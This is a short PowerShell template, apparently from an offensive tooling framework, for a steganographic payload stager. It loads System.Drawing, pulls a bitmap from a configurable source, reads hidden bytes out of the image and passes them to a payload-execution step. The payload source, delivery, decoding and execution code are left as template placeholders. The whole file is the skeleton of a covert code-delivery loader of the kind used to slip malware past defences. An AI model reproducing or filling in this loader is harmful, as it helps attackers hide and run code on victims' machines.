[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing")

[string] $image_source = "{{{ PAYLOAD_SOURCE }}}"
[Int32] $byte_length = {{{ MAX_BITS }}}

{{{ ALGORITHM_CODE }}}

$BitMap = {{{ PAYLOAD_DELIVERY_CODE }}}

$payload_data = Read $BitMap $length

{{{ PAYLOAD_EXEC_CODE }}}

Start-Sleep -s 3
